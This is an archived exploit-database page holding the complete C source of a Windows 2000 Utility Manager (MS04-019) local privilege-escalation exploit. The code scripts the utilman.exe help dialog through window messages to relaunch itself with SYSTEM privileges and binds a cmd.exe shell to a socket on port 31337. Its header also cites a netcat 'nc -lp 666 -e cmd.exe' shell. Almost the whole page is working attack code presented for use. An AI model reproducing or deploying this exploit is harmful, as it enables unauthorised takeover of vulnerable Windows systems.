<html><head><title>MS Windows 2k Utility Manager (All-In-One) Exploit (MS04-019)</title></head><pre>/******************************************************************************************
 *****C*****O*****R*****O******M******P*****U*******T*******E******R*****2***0***0***4****
 **                                 [Crpt] Utility Manager exploit v2.666 modified by kralor [Crpt]                               **
*******************************************************************************************
 **   It gets system language and sets windows names to work on any win2k :P                                            **
 **   Feel free to add other languages :)                                                                                                   **
 **   v2.666: added autonomous (allinone) remote exploitation system ;)                                                    **
 **   It can be executed through poor cmd.exe shells (like nc -lp 666 -e cmd.exe from a                                **
 **   normal user account). Must be called with an argument (any argument)                                                 **
 **   You know where we are..                                                                                                                  **
 *****C*****O*****R*****O******M******P*****U*******T*******E******R*****2***0***0***4****
 ******************************************************************************************/
/* original disclaimer */
//by Cesar Cerrudo  sqlsec&gt;at&lt;yahoo.com
//Local elevation of priviliges exploit for Windows 2K Utility Manager (second one!!!!)
//Gives you a shell with system privileges
//If you have problems try changing Sleep() values.
/* end of original disclaimer */

#include &lt;stdio.h&gt;
#include &lt;winsock2.h&gt;
#include &lt;windows.h&gt;
#include &lt;conio.h&gt;
#include &lt;io.h&gt;

#pragma comment (lib,&quot;ws2_32&quot;)

#define EXIT_SHELL &quot;exit -shell&quot;
#define HOST &quot;localhost&quot;
#define PORT 31337

struct {
 int id;
 char *utilman;
 char *winhelp;
 char *open;
} lang[] = {
	{ 0x0c,&quot;Gestionnaire d'utilitaires&quot;,&quot;aide de Windows&quot;,&quot;Ouvrir&quot; }, /* French  */
	{ 0x09,&quot;Utility manager&quot;,&quot;Windows Help&quot;,&quot;Open&quot; }		  /* English */
};

void print_lang(int id)
{
	char *lang_list[] = {&quot;Neutral&quot;,&quot;Arabic&quot;,&quot;Bulgarian&quot;,&quot;Catalan&quot;,&quot;Chinese&quot;,&quot;Czech&quot;,
			     &quot;Danish&quot;,&quot;German&quot;,&quot;Greek&quot;,&quot;English&quot;,&quot;Spanish&quot;,&quot;Finnish&quot;,
			     &quot;French&quot;,&quot;Hebrew&quot;,&quot;Hungarian&quot;,&quot;Icelandic&quot;,&quot;italian&quot;,
			     &quot;Japanese&quot;,&quot;Korean&quot;,&quot;Dutch&quot;,&quot;Norwegian&quot;,&quot;Polish&quot;,
			     &quot;Portuguese&quot;,&quot;Romanian&quot;,&quot;Russian&quot;,&quot;Croatian&quot;,&quot;Serbian&quot;,
			     &quot;Slovak&quot;,&quot;Albanian&quot;,&quot;Swedish&quot;,&quot;Thai&quot;,&quot;Turkish&quot;,&quot;Urdu&quot;,
			     &quot;Indonesian&quot;,&quot;Ukrainian&quot;,&quot;Belarusian&quot;,&quot;Slovenian&quot;,
			     &quot;Estonian&quot;,&quot;Latvian&quot;,&quot;Lithuanian&quot;,&quot;Farsi&quot;,&quot;Vietnamese&quot;,
			     &quot;Armenian&quot;,&quot;Azeri&quot;,&quot;Basque&quot;,&quot;FYRO Macedonian&quot;,&quot;Afrikaans&quot;,
			     &quot;Georgian&quot;,&quot;Faeroese&quot;,&quot;Hindi&quot;,&quot;Malay&quot;,&quot;Kazak&quot;,&quot;Kyrgyz&quot;,
			     &quot;Swahili&quot;,&quot;Uzbek&quot;,&quot;Tatar&quot;,&quot;Not supported&quot;,&quot;Punjabi&quot;,
			     &quot;Gujarati&quot;,&quot;Not supported&quot;,&quot;Tamil&quot;,&quot;Telugu&quot;,&quot;Kannada&quot;,
			     &quot;Not supported&quot;,&quot;Not supported&quot;,&quot;Marathi&quot;,&quot;Sanskrit&quot;,
			     &quot;Mongolian&quot;,&quot;Galician the best ;)&quot;,&quot;Konkani&quot;,&quot;Not supported&quot;,
			     &quot;Not supported&quot;,&quot;Syriac&quot;,&quot;Not supported&quot;,&quot;Not supported&quot;,
			     &quot;Divehi&quot;,&quot;Invariant&quot;};
	printf(&quot;%s\r\n&quot;,lang_list[id]);
	return;
}

int cnx(char *host, int port)
{
	SOCKET sock;
	struct sockaddr_in yeah;
	struct hostent *she;
	PROCESS_INFORMATION ProcessInformation;
	STARTUPINFO si;

	printf(&quot;[i] should be called by myself, try with any argument to load the attack\r\n&quot;);
	fflush(stdout);
	sock = WSASocket(0x02,0x01,0x00,0x00,0x00,0x00);
	if(!sock) {
		printf(&quot;error: unable to create socket\r\n&quot;);
		return -1;
		}

	yeah.sin_family=AF_INET; 
	yeah.sin_addr.s_addr=inet_addr(host); 
	yeah.sin_port=htons((u_short)port);

if((she=gethostbyname(host))!=NULL) { 
	memcpy((char *)&amp;yeah.sin_addr,she-&gt;h_addr,she-&gt;h_length); 
	} else { 
	if((yeah.sin_addr.s_addr=inet_addr(host))==INADDR_NONE) {
		printf(&quot;error: cannot resolve host\r\n&quot;);
		return -1;
		} 
	}
	if(connect(sock,(struct sockaddr*)&amp;yeah,sizeof(yeah))!=0) {
		printf(&quot;error: connection refused\r\n&quot;);
		return -1;
		}

	si.cb = 0x44;
	si.lpReserved = 0x00;
	si.lpTitle = 0x00;
	si.lpDesktop = 0x00;
	si.dwX = 0x00;
	si.dwY = 0x00;
	si.dwXSize = 0x00;
	si.dwYSize = 0x00;
	si.wShowWindow = 0x00;
	si.lpReserved2 = 0x00;
	si.cbReserved2 = 0x00;

	si.dwFlags = 0x101;

	si.hStdInput  = (void *)sock;
	si.hStdOutput = (void *)sock;
	si.hStdError = (void *)sock;

	if(!CreateProcess(0x00, &quot;cmd&quot;, 0x00, 0x00, 0x01, 0x10, 0x00, 0x00,&amp;si, &amp;ProcessInformation)) {
		printf(&quot;CreateProcess() error\r\n&quot;);
		return -1;
	}
	return 0;
}

void cmdshell(int sock)
{
	int length=666;
	char buffer[1024];

while(length) {
		length=read(0,buffer,sizeof(buffer));
		buffer[length]=0;
		if(!strncmp(buffer,EXIT_SHELL,strlen(EXIT_SHELL))) {
			send(sock,&quot;exit\r\n&quot;,6,0);
			break;
			}
		length=send(sock,buffer,length,0);
		if (length&lt;=0) {
			printf(&quot;[i] Connection closed.\n&quot;);
			exit(0);
		}
	}
	printf(&quot;[i] Connection successfully exited.\r\n&quot;);
	exit(0);
}

void wait_cnx(int port) {
	int sock, s,t;
	struct sockaddr_in my_addr;
	struct sockaddr_in their_addr;
    int sin_size;
	char buffer[4095];

if((sock = socket(AF_INET, SOCK_STREAM, 0))==-1) {
	printf(&quot;error: unable to create socket\r\n&quot;);
	exit(1);
	}
	my_addr.sin_family=AF_INET;        
	my_addr.sin_port=htons((u_short)port);
	my_addr.sin_addr.s_addr=INADDR_ANY; 
if(bind(sock, (struct sockaddr *)&amp;my_addr, sizeof(struct sockaddr))==-1) {
	printf(&quot;error: unable to bind socket on port %d\r\n&quot;,port);
	exit(1);
	}
if(listen(sock, 3)==-1) {
	printf(&quot;error: unable to listen\r\n&quot;);
	exit(1);
	}
	sin_size=sizeof(struct sockaddr_in);
	printf(&quot;[i] waiting connection on port %d\r\n&quot;,port);

if((s=accept(sock, (struct sockaddr *)&amp;their_addr,&amp;sin_size))==-1) {
	printf(&quot;error: unable to accept connection\r\n&quot;);
	exit(1);
	}
	memset(buffer,0,sizeof(buffer));
	printf(&quot;[i] host %s connected\r\n&quot;, inet_ntoa(their_addr.sin_addr));
	printf(&quot;[h] type 'exit -shell' to leave the shell\r\n\r\n&quot;);
	fflush(stdout);
	CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)cmdshell,(void*)s,0,&amp;t);
	while((sin_size=recv(s,buffer,sizeof(buffer),0))&gt;0) {
		buffer[sin_size]=0x00;
		printf(&quot;%s&quot;,buffer);
		fflush(stdout);
		}
	printf(&quot;\r\n[i] shell lost\r\n&quot;);
	return;
}

int set_lang(void)
{
	unsigned int lang_usr,lang_sys,id;

	id=GetSystemDefaultLangID();
	lang_sys=PRIMARYLANGID(id);
	id=GetUserDefaultLangID();
	lang_usr=PRIMARYLANGID(id);
	if(lang_usr!=lang_sys) {
		printf(&quot;warning: user language differs from system language\r\n\r\n&quot;);
		printf(&quot;1. system : &quot;);print_lang(lang_sys);
		printf(&quot;2. user   : &quot;);print_lang(lang_usr);printf(&quot;Select(1-2): &quot;);
		fflush(stdout);
		id=getch();
	if(id!=49&amp;&amp;id!=50) {
		printf(&quot;wrong choice '%c', leaving.\r\n&quot;,id);
		exit(0);
		}
	if(id==49) {
		printf(&quot;system language\r\n&quot;);
		return lang_sys;
		}
	else
		printf(&quot;user language\r\n&quot;);
	}
	return lang_usr;
}

void banner()
{
	printf(&quot;\r\n\r\n\t[Crpt] Utility Manager exploit v2.666 modified by kralor [Crpt]\r\n&quot;);
	printf(&quot;\t\t\t  base code by Cesar Cerrudo\r\n&quot;);
	printf(&quot;\t     added autonomous (allinone) remote exploitation system\r\n&quot;);
	printf(&quot;\t\t\t   You know where we are...\r\n\r\n&quot;);
	fflush(stdout);
	return;
}

void give_magicshell(void)
{
	cnx(HOST,PORT);
	exit(0);
	return;
}

void enter_filename(HWND hwnd,char *filename,int size)
{
	unsigned int i;

	for(i=0;i&lt;(unsigned int)size;i++)
		SendMessage(hwnd, WM_IME_KEYDOWN, toupper(filename[i]), 0);
	return;
}

int main(int argc, char* argv[])
{
    HWND lHandle, lHandle2;
    POINT point;
    char cmd[512];
	unsigned int i,j,t;
	int lang_id,path_len=1024;
	char *path;
	WSADATA wsa;
	HANDLE hdlr;

	banner();
	if(WSAStartup(0x101,&amp;wsa)) {
		printf(&quot;error: unable to load winsock\r\n&quot;);
		return -1;
	}
if(argc==1)
	give_magicshell();

	hdlr=CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)\
		 wait_cnx,(void*)PORT,0,&amp;t);
	Sleep(1000);

	printf(&quot;[+] Gathering system language information\r\n&quot;);
	lang_id=set_lang();
	printf(&quot;[+] OK language ...&quot;);print_lang(lang_id);
	fflush(stdout);
	for(i=0;i&lt;sizeof(lang)/sizeof(lang[0]);i++)
		if(lang[i].id==lang_id)
			break;
	if(i==sizeof(lang)/sizeof(lang[0])) {
		printf(&quot;error: undefined language.\r\n&quot;);
		return -1;
	}
	printf(&quot;[+] Trying to execute program with SYSTEM priviliges through utilman.exe\r\n&quot;);
	memset(cmd,0,sizeof(cmd));
	for(j=strlen(argv[0]);j&gt;0;j--)
		if(argv[0][j]=='\\') {
			j++;break;
		}
	strncpy(cmd,&amp;argv[0][j],508);
	if(cmd[strlen(cmd)-4]!='.')
		strcat(cmd,&quot;.exe&quot;);

	printf(&quot;prog: %s\r\n&quot;,cmd);
	cmd[strlen(cmd)-1]='?';
	fflush(stdout);
//  run utility manager
	WinExec(&quot;utilman.exe /start&quot;,SW_HIDE);
	Sleep(1000);

	lHandle=FindWindow(NULL, lang[i].utilman);   
    if (!lHandle) {
		printf(&quot;error: unable to start utilman.exe.\r\n&quot;);
		return 0;
	}

    PostMessage(lHandle,0x313,0,0); //=right click on the app button in the taskbar or Alt+Space Bar
	Sleep(100);

	SendMessage(lHandle,0x365,0,0x1); //send WM_COMMANDHELP  0x0365  lParam must be&lt;&gt;NULL 
	Sleep(300);
        
	SendMessage (FindWindow(NULL, lang[i].winhelp), WM_IME_KEYDOWN, VK_RETURN, 0);
	Sleep(500);

        // find open file dialog window
	lHandle = FindWindow(&quot;#32770&quot;,lang[i].open);
    // get input box handle
    lHandle2 = GetDlgItem(lHandle, 0x47C);
    Sleep(500);

	path=(char*)malloc(path_len);
	GetCurrentDirectory(path_len,path);
	printf(&quot;path: %s\r\n&quot;,path);
    SendMessage (lHandle2, WM_SETTEXT, 0, (LPARAM)path);
    SendMessage (lHandle2, WM_IME_KEYDOWN, VK_RETURN, 0);
	free(path);
	fflush(stdout);

    // set text to filter listview to display only cmd.exe
    SendMessage (lHandle2, WM_SETTEXT, 0, (LPARAM)cmd);
    Sleep(800);

    // send return
    SendMessage (lHandle2, WM_IME_KEYDOWN, VK_RETURN, 0);

    //get navigation bar handle
    lHandle2 = GetDlgItem(lHandle, 0x4A0);
    
    //send tab
    SendMessage (lHandle2, WM_IME_KEYDOWN, VK_TAB, 0);
    Sleep(500);
    lHandle2 = FindWindowEx(lHandle,NULL,&quot;SHELLDLL_DefView&quot;, NULL);
    //get list view handle
    lHandle2 = GetDlgItem(lHandle2, 0x1);

	enter_filename(lHandle2,cmd,strlen(cmd)-4);
    Sleep(500);

    //popup context menu
    PostMessage (lHandle2, WM_CONTEXTMENU, 0, 0);
    Sleep(1000);

    // get context menu handle
    point.x =10; point.y =30;
    lHandle2=WindowFromPoint(point);

    SendMessage (lHandle2, WM_KEYDOWN, VK_DOWN, 0); // move down in menu
    SendMessage (lHandle2, WM_KEYDOWN, VK_DOWN, 0); // move down in menu
    SendMessage (lHandle2, WM_KEYDOWN, VK_RETURN, 0); // send return

    SendMessage (lHandle, WM_CLOSE,0,0); // close open file dialog window
    Sleep(500);

	SendMessage (FindWindow(NULL, lang[i].winhelp), WM_CLOSE, 0, 0);// close open error window
	SendMessage (FindWindow(NULL, lang[i].utilman), WM_CLOSE, 0, 0);// close utilitymanager
	WaitForSingleObject(hdlr,INFINITE);
	WSACleanup();
	return 0;
}

// milw0rm.com [2004-07-20]</pre></html>